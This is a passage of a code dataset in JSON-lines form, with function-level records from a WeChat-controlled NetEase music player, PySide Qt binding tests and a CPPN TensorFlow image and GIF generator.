threading.Thread(target=runInThread,\n                              args=(onExit, popenArgs['mp3_url']))\n    cache_thread = threading.Thread(\n        target=cacheSong,\n        args=(popenArgs['song_id'], popenArgs['song_name'], popenArgs[\n            'artist'], popenArgs['mp3_url']))\n    cache_thread.start()\nthread.start()\nlyric_download_thread = threading.Thread(target=getLyric, args=())\nlyric_download_thread.start()\ntlyric_download_thread = threading.Thread(target=gettLyric, args=())\ntlyric_download_thread.start()\n# returns immediately after the thread starts\nreturn thread", "path": "neteaseApi\\player.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "'''\nDatabase stores every info.\n\nversion int\n#if value in file is unequal to value defined in this class.\n#An database update will be applied.\nuser dict:\n    username str\n    key str\ncollections list:\n    collection_info(dict):\n        collection_name str\n        collection_type str\n        collection_describe str\n        collection_songs list:\n            song_id(int)\nsongs dict:\n    song_id(int) dict:\n        song_id int\n        artist str\n        song_name str\n        mp3_url str\n        album_name str\n        album_id str\n        quality str\n        lyric str\n        tlyric str\nplayer_info dict:\n    player_list list:\n        songs_id(int)\n    playing_list list:\n        songs_id(int)\n    playing_mode int\n    playing_offset int\n\n\n:return:\n'''\n", "func_signal": "def __init__(self):\n", "code": "if hasattr(self, '_init'):\n    return\nself._init = True\nself.version = 4\nself.database = {\n    'version': 4,\n    'user': {\n        'username': '',\n        'password': '',\n        'user_id': '',\n        'nickname': '',\n    },\n    'collections': [[]],\n    'songs': {},\n    'player_info': {\n        'player_list': [],\n        'player_list_type': '',\n        'player_list_title': '',\n        'playing_list': [],\n        'playing_mode': 0,\n        'idx': 0,\n        'ridx': 0,\n        'playing_volume': 60,\n    }\n}\nself.storage_path = Constant.storage_path\nself.cookie_path = Constant.cookie_path\nself.file = None", "path": "neteaseApi\\storage.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "'''\n    only normal values will be updated here\n'''\n", "func_signal": "def update_info_dict(oldInfoDict, newInfoDict):\n", "code": "for k, v in newInfoDict.items():\n    if any((isinstance(v, t) for t in (tuple, list, dict))):\n        pass # these values will be updated somewhere else\n    elif oldInfoDict.get(k) is None or v not in (None, '', '0', 0):\n        oldInfoDict[k] = v", "path": "itchat\\components\\contact.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "# \u68c0\u67e5\u66f4\u65b0 && \u7b7e\u5230\n", "func_signal": "def check_version(self):\n", "code": "try:\n    mobilesignin = self.netease.daily_signin(0)\n    if mobilesignin != -1 and mobilesignin['code'] not in (-2, 301):\n        notify('\u79fb\u52a8\u7aef\u7b7e\u5230\u6210\u529f', 1)\n    time.sleep(0.5)\n    pcsignin = self.netease.daily_signin(1)\n    if pcsignin != -1 and pcsignin['code'] not in (-2, 301):\n        notify('PC\u7aef\u7b7e\u5230\u6210\u529f', 1)\n    tree = ET.ElementTree(ET.fromstring(self.netease.get_version()))\n    root = tree.getroot()\n    return root[0][4][0][0].text\nexcept (ET.ParseError, TypeError) as e:\n    log.error(e)\n    return 0", "path": "neteaseApi\\menu.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "# carousel x in [left, right]\n", "func_signal": "def carousel(left, right, x):\n", "code": "if x > right:\n    return left\nelif x < left:\n    return right\nelse:\n    return x", "path": "neteaseApi\\menu.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "'''\n    get a list of chatrooms for updating local chatrooms\n    return a list of given chatrooms with updated info\n'''\n", "func_signal": "def update_local_chatrooms(core, l):\n", "code": "for chatroom in l:\n    # format new chatrooms\n    utils.emoji_formatter(chatroom, 'NickName')\n    for member in chatroom['MemberList']:\n        utils.emoji_formatter(member, 'NickName')\n        utils.emoji_formatter(member, 'DisplayName')\n    # update it to old chatrooms\n    oldChatroom = utils.search_dict_list(\n        core.chatroomList, 'UserName', chatroom['UserName'])\n    if oldChatroom:\n        update_info_dict(oldChatroom, chatroom)\n        #  - update other values\n        memberList, oldMemberList = (c.get('MemberList', [])\n                for c in (chatroom, oldChatroom))\n        if memberList:\n            for member in memberList:\n                oldMember = utils.search_dict_list(\n                    oldMemberList, 'UserName', member['UserName'])\n                if oldMember:\n                    update_info_dict(oldMember, member)\n                else:\n                    oldMemberList.append(member)\n    else:\n        oldChatroom = chatroom\n        core.chatroomList.append(chatroom)\n    # delete useless members\n    if len(chatroom['MemberList']) != len(oldChatroom['MemberList']) and \\\n            chatroom['MemberList']:\n        existsUserNames = [member['UserName'] for member in chatroom['MemberList']]\n        delList = []\n        for i, member in enumerate(oldChatroom['MemberList']):\n            if member['UserName'] not in existsUserNames: delList.append(i)\n        delList.sort(reverse=True)\n        for i in delList: del oldChatroom['MemberList'][i]\n    #  - update OwnerUin\n    if oldChatroom.get('ChatRoomOwner') and oldChatroom.get('MemberList'):\n        oldChatroom['OwnerUin'] = utils.search_dict_list(oldChatroom['MemberList'],\n            'UserName', oldChatroom['ChatRoomOwner']).get('Uin', 0)\n    #  - update isAdmin\n    if 'OwnerUin' in oldChatroom and oldChatroom['OwnerUin'] != 0:\n        oldChatroom['isAdmin'] = \\\n            oldChatroom['OwnerUin'] == int(core.loginInfo['wxuin'])\n    else:\n        oldChatroom['isAdmin'] = None\n    #  - update self\n    newSelf = utils.search_dict_list(oldChatroom['MemberList'],\n        'UserName', core.storageClass.userName)\n    oldChatroom['self'] = newSelf or copy.deepcopy(core.loginInfo['User'])\nreturn {\n    'Type'         : 'System',\n    'Text'         : [chatroom['UserName'] for chatroom in l],\n    'SystemInfo'   : 'chatrooms',\n    'FromUserName' : core.storageClass.userName,\n    'ToUserName'   : core.storageClass.userName, }", "path": "itchat\\components\\contact.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "# \u6392\u884c\u699c\n", "func_signal": "def choice_channel(self, idx):\n", "code": "netease = self.netease\nif idx == 0:\n    self.datalist = netease.return_toplists()\n    self.title += ' > \u6392\u884c\u699c'\n    self.datatype = 'toplists'\n\n# \u827a\u672f\u5bb6\nelif idx == 1:\n    artists = netease.top_artists()\n    self.datalist = netease.dig_info(artists, 'artists')\n    self.title += ' > \u827a\u672f\u5bb6'\n    self.datatype = 'artists'\n\n# \u65b0\u789f\u4e0a\u67b6\nelif idx == 2:\n    albums = netease.new_albums()\n    self.datalist = netease.dig_info(albums, 'albums')\n    self.title += ' > \u65b0\u789f\u4e0a\u67b6'\n    self.datatype = 'albums'\n\n# \u7cbe\u9009\u6b4c\u5355\nelif idx == 3:\n    self.datalist = [\n        {\n            'title': '\u5168\u7ad9\u7f6e\u9876',\n            'datatype': 'top_playlists',\n            'callback': netease.top_playlists\n        }, {\n            'title': '\u5206\u7c7b\u7cbe\u9009',\n            'datatype': 'playlist_classes',\n            'callback': netease.playlist_classes\n        }\n    ]\n    self.title += ' > \u7cbe\u9009\u6b4c\u5355'\n    self.datatype = 'playlists'\n\n# \u6211\u7684\u6b4c\u5355\nelif idx == 4:\n    myplaylist = self.request_api(self.netease.user_playlist, self.userid)\n    if myplaylist == -1:\n        return\n    self.datatype = 'top_playlists'\n    self.datalist = netease.dig_info(myplaylist, self.datatype)\n    self.title += ' > ' + self.username + ' \u7684\u6b4c\u5355'\n\n# \u4e3b\u64ad\u7535\u53f0\nelif idx == 5:\n    self.datatype = 'djchannels'\n    self.title += ' > \u4e3b\u64ad\u7535\u53f0'\n    self.datalist = netease.djchannels()\n\n# \u6bcf\u65e5\u63a8\u8350\nelif idx == 6:\n    self.datatype = 'songs'\n    self.title += ' > \u6bcf\u65e5\u63a8\u8350'\n    myplaylist = self.request_api(self.netease.recommend_playlist)\n    if myplaylist == -1:\n        return\n    self.datalist = self.netease.dig_info(myplaylist, self.datatype)\n\n# \u79c1\u4ebaFM\nelif idx == 7:\n    self.datatype = 'fmsongs'\n    self.title += ' > \u79c1\u4ebaFM'\n    self.datalist = self.get_new_fm()\n\n# \u641c\u7d22\nelif idx == 8:\n    self.datatype = 'search'\n    self.title += ' > \u641c\u7d22'\n    self.datalist = ['\u6b4c\u66f2', '\u827a\u672f\u5bb6', '\u4e13\u8f91', '\u7f51\u6613\u7cbe\u9009\u96c6']\n\n# \u5e2e\u52a9\nelif idx == 9:\n    self.datatype = 'help'\n    self.title += ' > \u5e2e\u52a9'\n    self.datalist = shortcut\n\nself.offset = 0\nself.index = 0", "path": "neteaseApi\\menu.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "'''\n    content contains uins and StatusNotifyUserName contains username\n    they are in same order, so what I do is to pair them together\n\n    I caught an exception in this method while not knowing why\n    but don't worry, it won't cause any problem\n'''\n", "func_signal": "def update_local_uin(core, msg):\n", "code": "uins = re.search('<username>([^<]*?)<', msg['Content'])\nusernameChangedList = []\nr = {\n    'Type': 'System',\n    'Text': usernameChangedList,\n    'SystemInfo': 'uins', }\nif uins:\n    uins = uins.group(1).split(',')\n    usernames = msg['StatusNotifyUserName'].split(',')\n    if 0 < len(uins) == len(usernames):\n        for uin, username in zip(uins, usernames):\n            if not '@' in username: continue\n            fullContact = core.memberList + core.chatroomList + core.mpList\n            userDicts = utils.search_dict_list(fullContact,\n                'UserName', username)\n            if userDicts:\n                if userDicts.get('Uin', 0) == 0:\n                    userDicts['Uin'] = uin\n                    usernameChangedList.append(username)\n                    logger.debug('Uin fetched: %s, %s' % (username, uin))\n                else:\n                    if userDicts['Uin'] != uin:\n                        logger.debug('Uin changed: %s, %s' % (\n                            userDicts['Uin'], uin))\n            else:\n                if '@@' in username:\n                    update_chatroom(core, username)\n                    newChatroomDict = utils.search_dict_list(\n                        core.chatroomList, 'UserName', username)\n                    if newChatroomDict is None:\n                        newChatroomDict = utils.struct_friend_info({\n                            'UserName': username,\n                            'Uin': uin, })\n                        core.chatroomList.append(newChatroomDict)\n                    else:\n                        newChatroomDict['Uin'] = uin\n                elif '@' in username:\n                    update_friend(core, username)\n                    newFriendDict = utils.search_dict_list(\n                        core.memberList, 'UserName', username)\n                    newFriendDict['Uin'] = uin\n                usernameChangedList.append(username)\n                logger.debug('Uin fetched: %s, %s' % (username, uin))\n    else:\n        logger.debug('Wrong length of uins & usernames: %s, %s' % (\n            len(uins), len(usernames)))\nelse:\n    logger.debug('No uins in 51 message')\n    logger.debug(msg['Content'])\nreturn r", "path": "itchat\\components\\contact.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "''' Search a list of dict\n    * return dict with specific value & key '''\n", "func_signal": "def search_dict_list(l, key, value):\n", "code": "for i in l:\n    if i.get(key) == value: return i", "path": "itchat\\utils.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "''' Add a friend or accept a friend\n    * for adding status should be 2\n    * for accepting status should be 3\n'''\n", "func_signal": "def add_friend(self, userName, status=2, verifyContent='', autoUpdate=True):\n", "code": "url = '%s/webwxverifyuser?r=%s&pass_ticket=%s' % (\n    self.loginInfo['url'], int(time.time()), self.loginInfo['pass_ticket'])\ndata = {\n    'BaseRequest': self.loginInfo['BaseRequest'],\n    'Opcode': status, # 3\n    'VerifyUserListSize': 1,\n    'VerifyUserList': [{\n        'Value': userName,\n        'VerifyUserTicket': '', }],\n    'VerifyContent': verifyContent,\n    'SceneListCount': 1,\n    'SceneList': 33, # [33]\n    'skey': self.loginInfo['skey'], }\nheaders = {\n    'ContentType': 'application/json; charset=UTF-8',\n    'User-Agent' : config.USER_AGENT }\nr = self.s.post(url, headers=headers,\n    data=json.dumps(data, ensure_ascii=False).encode('utf8', 'replace'))\nif autoUpdate: self.update_friend(userName)\nreturn ReturnValue(rawResponse=r)", "path": "itchat\\components\\contact.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "# if same playlists && idx --> same song :: pause/resume it\n", "func_signal": "def play_and_pause(self, idx):\n", "code": "if self.info['idx'] == idx:\n    if self.pause_flag:\n        self.resume()\n    else:\n        self.pause()\nelse:\n    self.info['idx'] = idx\n\n    # if it's playing\n    if self.playing_flag:\n        self.switch()\n\n    # start new play\n    else:\n        self.recall()", "path": "neteaseApi\\player.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "# get terminal size\n", "func_signal": "def update_size(self):\n", "code": "size = terminalsize.get_terminal_size()\nself.x = max(size[0], 10)\nself.y = max(size[1], 25)\n\n# update intendations\ncurses.resizeterm(self.y, self.x)\nself.startcol = int(float(self.x) / 5)\nself.indented_startcol = max(self.startcol - 3, 0)\nself.update_space()\nself.screen.clear()\nself.screen.refresh()", "path": "neteaseApi\\ui.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "# _emoji_deebugger is for bugs about emoji match caused by wechat backstage\n# like :face with tears of joy: will be replaced with :cat face with tears of joy:\n", "func_signal": "def emoji_formatter(d, k):\n", "code": "def _emoji_debugger(d, k):\n    s = d[k].replace('<span class=\"emoji emoji1f450\"></span',\n        '<span class=\"emoji emoji1f450\"></span>') # fix missing bug\n    def __fix_miss_match(m):\n        return '<span class=\"emoji emoji%s\"></span>' % ({\n            '1f63c': '1f601', '1f639': '1f602', '1f63a': '1f603',\n            '1f4ab': '1f616', '1f64d': '1f614', '1f63b': '1f60d',\n            '1f63d': '1f618', '1f64e': '1f621', '1f63f': '1f622',\n            }.get(m.group(1), m.group(1)))\n    return emojiRegex.sub(__fix_miss_match, s)\ndef _emoji_formatter(m):\n    s = m.group(1)\n    if len(s) == 6:\n        return ('\\\\U%s\\\\U%s'%(s[:2].rjust(8, '0'), s[2:].rjust(8, '0'))\n            ).encode('utf8').decode('unicode-escape', 'replace')\n    elif len(s) == 10:\n        return ('\\\\U%s\\\\U%s'%(s[:5].rjust(8, '0'), s[5:].rjust(8, '0'))\n            ).encode('utf8').decode('unicode-escape', 'replace')\n    else:\n        return ('\\\\U%s'%m.group(1).rjust(8, '0')\n            ).encode('utf8').decode('unicode-escape', 'replace')\nd[k] = _emoji_debugger(d, k)\nd[k] = emojiRegex.sub(_emoji_formatter, d[k])", "path": "itchat\\utils.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "# get terminal width\n# src: http://stackoverflow.com/questions/263890/how-do-i-find-the-width-height-of-a-terminal-window # NOQA\n", "func_signal": "def _get_terminal_size_tput():\n", "code": "try:\n    cols = int(subprocess.check_call(shlex.split('tput cols')))\n    rows = int(subprocess.check_call(shlex.split('tput lines')))\n    return (cols, rows)\nexcept Exception as e:\n    log.error(e)\n    pass", "path": "neteaseApi\\terminalsize.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "''' get head image\n * if you want to get chatroom header: only set chatroomUserName\n * if you want to get friend header: only set userName\n * if you want to get chatroom member header: set both\n'''\n", "func_signal": "def get_head_img(self, userName=None, chatroomUserName=None, picDir=None):\n", "code": "params = {\n    'userName': userName or chatroomUserName or self.storageClass.userName,\n    'skey': self.loginInfo['skey'], }\nurl = '%s/webwxgeticon' % self.loginInfo['url']\nif chatroomUserName is None:\n    infoDict = self.storageClass.search_friends(userName=userName)\n    if infoDict is None:\n        return ReturnValue({'BaseResponse': {\n            'ErrMsg': 'No friend found',\n            'Ret': -1001, }})\nelse:\n    if userName is None:\n        url = '%s/webwxgetheadimg' % self.loginInfo['url']\n    else:\n        chatroom = self.storageClass.search_chatrooms(userName=chatroomUserName)\n        if chatroomUserName is None:\n            return ReturnValue({'BaseResponse': {\n                'ErrMsg': 'No chatroom found',\n                'Ret': -1001, }})\n        if chatroom['EncryChatRoomId'] == '':\n            chatroom = self.update_chatroom(chatroomUserName)\n        params['chatroomid'] = chatroom['EncryChatRoomId']\nheaders = { 'User-Agent' : config.USER_AGENT }\nr = self.s.get(url, params=params, stream=True, headers=headers)\ntempStorage = io.BytesIO()\nfor block in r.iter_content(1024):\n    tempStorage.write(block)\nif picDir is None:\n    return tempStorage.getvalue()\nwith open(picDir, 'wb') as f: f.write(tempStorage.getvalue())\nreturn ReturnValue({'BaseResponse': {\n    'ErrMsg': 'Successfully downloaded',\n    'Ret': 0, }})", "path": "itchat\\components\\contact.py", "repo_name": "yaphone/RasWxNeteaseMusic", "stars": 342, "license": "None", "language": "python", "size": 157}
{"docstring": "#QGraphicsScene.addSimpleText\n", "func_signal": "def testSimpleText(self):\n", "code": "item = self.scene.addSimpleText('Monty Python 42')\nself.assertTrue(isinstance(item, QGraphicsSimpleTextItem))", "path": "tests\\QtGui\\qgraphicsscene_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "\"\"\"Utility method to connect a list of receivers to a signal.\nsender - QObject that will emit the signal\nsignal - string with the signal signature\nemitter - the callable that will trigger the signal\nreceivers - list of BasicPySlotCase instances\nargs - tuple with the arguments to be sent.\n\"\"\"\n\n", "func_signal": "def run_many(self, sender, signal, emitter, receivers, args=None):\n", "code": "if args is None:\n    args = tuple()\n\nfor rec in receivers:\n    rec.setUp()\n    QObject.connect(sender, SIGNAL(signal), rec.cb)\n    rec.args = tuple(args)\n\nemitter(*args)\n\nfor rec in receivers:\n    self.assert_(rec.called)", "path": "tests\\signals\\multiple_connections_gui_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "#QGraphicsScene.addLine\n", "func_signal": "def testLine(self):\n", "code": "item = self.scene.addLine(100, 100, 200, 200)\nself.assertTrue(isinstance(item, QGraphicsLineItem))", "path": "tests\\QtGui\\qgraphicsscene_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "#Release resources\n", "func_signal": "def tearDown(self):\n", "code": "del self.scene\nsuper(AddItem, self).tearDown()", "path": "tests\\QtGui\\qgraphicsscene_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "#QGraphicsScene.addPath\n", "func_signal": "def testPath(self):\n", "code": "item = self.scene.addPath(QPainterPath())\nself.assertTrue(isinstance(item, QGraphicsPathItem))", "path": "tests\\QtGui\\qgraphicsscene_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "#Release resources\n", "func_signal": "def tearDown(self):\n", "code": "del self.scene\nsuper(ItemRetrieve, self).tearDown()", "path": "tests\\QtGui\\qgraphicsscene_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "#Acquire resources\n", "func_signal": "def setUp(self):\n", "code": "super(AddItem, self).setUp()\nself.scene = QGraphicsScene()\n# While the scene does not inherits from QWidget, requires\n# an application to make the internals work.", "path": "tests\\QtGui\\qgraphicsscene_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "#QGraphicsScene.addEllipse\n", "func_signal": "def testEllipse(self):\n", "code": "item = self.scene.addEllipse(100, 100, 100, 100)\nself.assertTrue(isinstance(item, QGraphicsEllipseItem))", "path": "tests\\QtGui\\qgraphicsscene_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "# Related to bug #716\n", "func_signal": "def testPassQPersistentModelIndexAsQModelIndex(self):\n", "code": "m = MyModel()\nidx = QPersistentModelIndex()\nm.span(idx)", "path": "tests\\QtCore\\qabstractitemmodel_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "#QGraphicsScene.addPixmap\n", "func_signal": "def testPixmap(self):\n", "code": "item = self.scene.addPixmap(QPixmap())\nself.assertTrue(isinstance(item, QGraphicsPixmapItem))", "path": "tests\\QtGui\\qgraphicsscene_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "#QGraphicsScene.itemAt()\n", "func_signal": "def testItemAt(self):\n", "code": "self.assertEqual(self.scene.itemAt(50, 50), self.topleft)\nself.assertEqual(self.scene.itemAt(150, 50), self.topright)\nself.assertEqual(self.scene.itemAt(50, 150), self.bottomleft)\nself.assertEqual(self.scene.itemAt(150, 150), self.bottomright)", "path": "tests\\QtGui\\qgraphicsscene_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "#QGraphicsScene.addRect\n", "func_signal": "def testRect(self):\n", "code": "item = self.scene.addRect(100, 100, 100, 100)\nself.assertTrue(isinstance(item, QGraphicsRectItem))", "path": "tests\\QtGui\\qgraphicsscene_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "#QUdpSocket.readDatagram pythonic return\n# @bug 124\n", "func_signal": "def testDefaultArgs(self):\n", "code": "QObject.connect(self.server, SIGNAL('readyRead()'), self.callback)\nself.sendPackage()\nself.app.exec_()\n\nself.assert_(self.called)", "path": "tests\\QtNetwork\\udpsocket_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "\"\"\"Multiple connections to QSpinBox.valueChanged(int)\"\"\"\n", "func_signal": "def testSpinBoxValueChanged(self):\n", "code": "sender = QSpinBox()\n#FIXME if number of receivers if higher than 50, segfaults\nreceivers = [BasicPySlotCase() for x in range(10)]\nself.run_many(sender, 'valueChanged(int)', sender.setValue,\n              receivers, (1,))", "path": "tests\\signals\\multiple_connections_gui_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "# this test only check if the signals are present\n", "func_signal": "def testForNotifierSignals(self):\n", "code": "notifier = Phonon.BackendCapabilities.Notifier()\nnotifier.capabilitiesChanged.connect(self.myCB)\nnotifier.availableAudioOutputDevicesChanged.connect(self.myCB)\n\nself.assert_(True)", "path": "tests\\phonon\\bug_328.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "#QGraphicsScene.addPolygon\n", "func_signal": "def testPolygon(self):\n", "code": "points = [QPointF(0, 0), QPointF(100, 100), QPointF(0, 100)]\nitem = self.scene.addPolygon(QPolygonF(points))\nself.assertTrue(isinstance(item, QGraphicsPolygonItem))", "path": "tests\\QtGui\\qgraphicsscene_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "\"\"\"Multiple connections to QPushButton.clicked()\"\"\"\n", "func_signal": "def testButtonClick(self):\n", "code": "sender = QPushButton('button')\nreceivers = [BasicPySlotCase() for x in range(30)]\nself.run_many(sender, 'clicked()', sender.click, receivers)", "path": "tests\\signals\\multiple_connections_gui_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "#Release resources\n", "func_signal": "def tearDown(self):\n", "code": "del self.socket\ndel self.server\ndel self.app", "path": "tests\\QtNetwork\\udpsocket_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "#QGraphicsScene.addText\n", "func_signal": "def testText(self):\n", "code": "item = self.scene.addText('Monty Python 42')\nself.assertTrue(isinstance(item, QGraphicsTextItem))", "path": "tests\\QtGui\\qgraphicsscene_test.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "'''Difference between PySide and PyQt4 versions of qt bindings.\nReturns a tuple with the members present only on PySide and only on PyQt4'''\n", "func_signal": "def check_module_diff(module_name):\n", "code": "boost_module = getattr(__import__('PySide.' + module_name), module_name)\norig_module = getattr(__import__('PyQt4.' + module_name), module_name)\n\nboost_set = set(dir(boost_module))\norig_set = set(dir(orig_module))\n\nreturn sorted(boost_set - orig_set), sorted(orig_set - boost_set)", "path": "tests\\util\\pyqt_diff.py", "repo_name": "pyside/PySide", "stars": 278, "license": "lgpl-2.1", "language": "python", "size": 10727}
{"docstring": "\"\"\" readGif(filename, asNumpy=True)\n\nRead images from an animated GIF file.  Returns a list of numpy\narrays, or, if asNumpy is false, a list if PIL images.\n\n\"\"\"\n\n# Check PIL\n", "func_signal": "def readGif(filename, asNumpy=True):\n", "code": "if PIL is None:\n    raise RuntimeError(\"Need PIL to read animated gif files.\")\n\n# Check Numpy\nif np is None:\n    raise RuntimeError(\"Need Numpy to read animated gif files.\")\n\n# Check whether it exists\nif not os.path.isfile(filename):\n    raise IOError('File not found: '+str(filename))\n\n# Load file using PIL\npilIm = PIL.Image.open(filename)\npilIm.seek(0)\n\n# Read all images inside\nimages = []\ntry:\n    while True:\n        # Get image as numpy array\n        tmp = pilIm.convert() # Make without palette\n        a = np.asarray(tmp)\n        if len(a.shape)==0:\n            raise MemoryError(\"Too little memory to convert PIL image to array\")\n        # Store, and next\n        images.append(a)\n        pilIm.seek(pilIm.tell()+1)\nexcept EOFError:\n    pass\n\n# Convert to normal PIL images if needed\nif not asNumpy:\n    images2 = images\n    images = []\n    for im in images2:\n        images.append( PIL.Image.fromarray(im) )\n\n# Done\nreturn images", "path": "images2gif.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "'''\nimage_data is a tensor, in [height width depth]\nimage_data is NOT the PIL.Image class\n'''\n", "func_signal": "def show_image(self, image_data):\n", "code": "plt.subplot(1, 1, 1)\ny_dim = image_data.shape[0]\nx_dim = image_data.shape[1]\nc_dim = self.cppn.c_dim\nif c_dim > 1:\n  plt.imshow(image_data, interpolation='nearest')\nelse:\n  plt.imshow(image_data.reshape(y_dim, x_dim), cmap='Greys', interpolation='nearest')\nplt.axis('off')\nplt.show()", "path": "sampler.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "\"\"\" convertImagesToPIL(images, nq=0)\n\nConvert images to Paletted PIL images, which can then be\nwritten to a single animaged GIF.\n\n\"\"\"\n\n# Convert to PIL images\n", "func_signal": "def convertImagesToPIL(self, images, dither, nq=0):\n", "code": "images2 = []\nfor im in images:\n    if isinstance(im, Image.Image):\n        images2.append(im)\n    elif np and isinstance(im, np.ndarray):\n        if im.ndim==3 and im.shape[2]==3:\n            im = Image.fromarray(im,'RGB')\n        elif im.ndim==3 and im.shape[2]==4:\n            im = Image.fromarray(im[:,:,:3],'RGB')\n        elif im.ndim==2:\n            im = Image.fromarray(im,'L')\n        images2.append(im)\n\n# Convert to paletted PIL images\nimages, images2 = images2, []\nif nq >= 1:\n    # NeuQuant algorithm\n    for im in images:\n        im = im.convert(\"RGBA\") # NQ assumes RGBA\n        nqInstance = NeuQuant(im, int(nq)) # Learn colors from image\n        if dither:\n            im = im.convert(\"RGB\").quantize(palette=nqInstance.paletteImage())\n        else:\n            im = nqInstance.quantize(im)  # Use to quantize the image itself\n        images2.append(im)\nelse:\n    # Adaptive PIL algorithm\n    AD = Image.ADAPTIVE\n    for im in images:\n        im = im.convert('P', palette=AD, dither=dither)\n        images2.append(im)\n\n# Done\nreturn images2", "path": "images2gif.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "\"\"\" Integer to two bytes \"\"\"\n# devide in two parts (bytes)\n", "func_signal": "def intToBin(i):\n", "code": "i1 = i % 256\ni2 = int( i/256)\n# make string (little endian)\nreturn chr(i1) + chr(i2)", "path": "images2gif.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "'''\ncalculates and returns a vector of x and y coordintes, and corresponding radius from the centre of image.\n'''\n", "func_signal": "def _coordinates(self, x_dim = 32, y_dim = 32, scale = 1.0):\n", "code": "n_points = x_dim * y_dim\nx_range = scale*(np.arange(x_dim)-(x_dim-1)/2.0)/(x_dim-1)/0.5\ny_range = scale*(np.arange(y_dim)-(y_dim-1)/2.0)/(y_dim-1)/0.5\nx_mat = np.matmul(np.ones((y_dim, 1)), x_range.reshape((1, x_dim)))\ny_mat = np.matmul(y_range.reshape((y_dim, 1)), np.ones((1, x_dim)))\nr_mat = np.sqrt(x_mat*x_mat + y_mat*y_mat)\nx_mat = np.tile(x_mat.flatten(), self.batch_size).reshape(self.batch_size, n_points, 1)\ny_mat = np.tile(y_mat.flatten(), self.batch_size).reshape(self.batch_size, n_points, 1)\nr_mat = np.tile(r_mat.flatten(), self.batch_size).reshape(self.batch_size, n_points, 1)\nreturn x_mat, y_mat, r_mat", "path": "model.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "\"\"\" PIL weird interface for making a paletted image: create an image which\n    already has the palette, and use that in Image.quantize. This function\n    returns this palette image. \"\"\"\n", "func_signal": "def paletteImage(self):\n", "code": "if self.pimage is None:\n    palette = []\n    for i in range(self.NETSIZE):\n        palette.extend(self.colormap[i][:3])\n\n    palette.extend([0]*(256-self.NETSIZE)*3)\n\n    # a palette image to use for quant\n    self.pimage = Image.new(\"P\", (1, 1), 0)\n    self.pimage.putpalette(palette)\nreturn self.pimage", "path": "images2gif.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
